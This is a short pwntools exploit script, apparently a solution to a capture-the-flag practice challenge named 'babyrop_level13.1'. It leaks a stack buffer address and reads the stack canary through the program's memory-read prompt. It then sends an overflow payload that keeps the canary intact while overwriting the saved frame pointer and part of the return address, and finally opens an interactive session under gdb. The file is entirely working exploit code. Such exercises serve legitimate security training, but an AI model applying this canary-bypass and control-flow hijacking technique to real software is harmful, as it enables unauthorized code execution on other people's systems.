from pwn import *
binary = './babyrop_level13.1_patched'
elf = ELF(binary)
libc = ELF('./libc.so.6')
context.binary = binary
s = '''
b *main+387
#b *main+587
'''

p = process(binary)
offset = 0x50

# Get buffer address
p.recvuntil(b"Your input buffer is located at: ")
buffer_addr = int(p.recvuntil(b".\n\n", drop=True), 16)
print(f"[+] Input buffer is at: {hex(buffer_addr)}")

# Get canary
canary_addr = buffer_addr + offset - 0x8
p.sendlineafter(b"Address in hex to read from:\n", hex(canary_addr).encode())
p.recvuntil(b" = ")
canary = int(p.recvuntil(b"\n", drop=True), 16)
print(f"[+] Canary value: {hex(canary)}")

# Prepare for ROP
start_addr_ptr = buffer_addr + 0x108

# First payload to bypass canary and control flow
gdb.attach(p, s)
payload = flat(
	b'A' * 8,
	b'A'* 0x40,
	canary,
	start_addr_ptr - 8,
	b'\xc8\x58\x26'
)

p.send(payload)
p.interactive()
